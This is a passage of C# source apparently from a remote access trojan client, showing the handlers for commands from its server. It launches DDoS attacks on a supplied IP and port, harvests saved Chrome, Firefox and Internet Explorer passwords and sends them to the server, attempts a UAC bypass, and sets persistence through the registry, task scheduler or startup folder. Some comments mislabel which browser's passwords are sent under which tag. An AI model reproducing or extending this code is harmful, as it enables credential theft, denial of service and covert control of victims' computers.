                _reportHelper.ReportError(ErrorType.EXCEPTION, "[ERROR - HandleCameraFrames]", ex.Message);
                StopCameraStream();
            }
        }

        private void StopCameraStream()
        {
            _cameraSource.Stop();
            _cameraSource.NewFrame -= HandleCameraFrames;
            _cameraSource = null;
        }

        private readonly DDoS _ddos = new DDoS();

        private void StartDDoS(string text)
        {
            var data = text.Split('|'); //Get the command parts
            var ddosParams = new DDoSParams
                             {
                                 Ip = data[1], //Get the IP of the remote machine
                                 Port = data[2], //Get the port to attack on
                                 CProtocol = data[3], //Get the protocol to use
                                 CPacketSize = data[4], //Get the packet size to send
                                 CThreads = data[5], //Get the threads to attack with
                                 CDelay = data[6] //Get the delay between packet sends
                             };

            _ddos.StartDDoS(ddosParams); //Start the attack
        }

        private void StopDDoS()
        {
            _ddos.StopDDoS();
        }

        private void GetBrowserPasswords()
        {
            var chromePassReader = new ChromePassReader();
            var firefoxPassReader = new FirefoxPassReader();
            var IE10PassReader = new IE10PassReader();

            try
            {
                var gcpw = "gcpw\n" + PrintCredentias(chromePassReader.ReadPasswords()); //Get Google Chrome Passwords
                Thread.Sleep(1000);
                SendCommand(gcpw);

                var iepw = "iepw\n" + PrintCredentias(firefoxPassReader.ReadPasswords()); //Get Internet Explorer Passwords
                Thread.Sleep(1000);
                SendCommand(iepw);

                var ffpw = "ffpw\n" + PrintCredentias(IE10PassReader.ReadPasswords()); //Get Firefox passwords
                Thread.Sleep(1000);
                SendCommand(ffpw);
            }
            catch(Exception e)
            {
                SendCommand("getpwu"); //Send back empty results
                _reportHelper.ReportError(ErrorType.PASSWORD_RECOVERY_FAILED, "Can't recover passwords!", e.Message); //Report error to the server
            }
        }

        private string PrintCredentias(IEnumerable<CredentialModel> data)
        {
            return data.Aggregate(string.Empty, (current, d) => current + $"{d.Url}\r\n\tU: {d.Username}\r\n\tP: {d.Password}\r\n");
        }

        private void ByPassUAC()
        {
            var uac = new UAC(_reportHelper); //Create a new UAC module
            if (uac.IsAdmin()) //Check if we run as elevated
            {
                SendCommand("uac§a_admin"); //Notify the Server and don't re-bypass
                return;
            }

            try
            {
                if (uac.BypassUac())
                {
                    SendCommand("uac§s_admin"); //UAC bypassed!! :)
                } 
                else
                {
                    SendCommand("uac§f_admin"); //Failed to bypass UAC :(
                } 
            }
            catch (Exception) //Something went wrong
            {
                uac.ProbeStart(ProbeMethod.StartUpFolder); //Fallback to probing the startup folder
            }
        }

        private void WriteToProcess(string text)
        {
            var idAndMessage = text.Substring(text.IndexOf('§') + 1); //Get command parameters
            var message = idAndMessage.Substring(idAndMessage.IndexOf('§') + 1); //Get the message to send
            _ipcClientHandler.WriteToStream(message); //Send the message to the IPC server
        }

        private void StartNewIpcConnection(string text)
        {
            var serverName = text.Substring(text.IndexOf('§') + 1); //The server to start
            _ipcClientHandler.StartIpcHandler(); //Start the handler
            _ipcClientHandler.LaunchIpcChild(serverName); //Launch the child process
        }

        private void GetAvailableScreens()
        {
            // TODO: look into sending one message for all of the monitors
            foreach (Screen screen in Screen.AllScreens) //Loop through screens
            {
                var screenId = screen.DeviceName.Replace("\\\\.\\DISPLAY", ""); //Get the ID of the screen
                SendCommand("ScreenCount" + screenId); //Send the screen ID to the server
            }
        }

        private void SetStartupProbeOptions(string text)
        {
            string method = text.Substring(7); //Get the probing method
            var pm = ProbeMethod.StartUpFolder; //Declare a probing method

            //Parse the method to use
            switch(method)
            {
                case "Registry":
                    pm = ProbeMethod.Registry;
                    break;
                case "Task Scheduler":
                    pm = ProbeMethod.TaskScheduler;
                    break;
                case "Startup Folder":
                    pm = ProbeMethod.StartUpFolder;
                    break;
                default:
                    return;
            }

            UAC uac = new UAC(_reportHelper); //Create a new UAC module
            uac.ProbeStart(pm); //Probe the startup using the selected method

        }
    }
}
